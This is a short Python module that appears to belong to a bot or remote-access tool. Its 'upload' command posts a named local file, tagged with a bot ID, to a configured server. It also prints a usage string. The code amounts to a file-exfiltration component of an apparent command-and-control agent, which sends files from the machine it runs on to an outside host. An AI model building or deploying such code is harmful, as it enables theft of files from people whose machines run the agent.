import requests
import os

import utils
import settings


def run(filename):
    r = requests.post(settings.SERVER_URL + "/api/upload", {'botid': settings.BOT_ID, 'src': os.path.basename(filename)}, files={'uploaded': open(filename, 'rb')})
    utils.send_output(r.text)


def help():
    help_text = """
    Usage: upload path/to/local/file
    Uploads a file.

    """
    return help_text
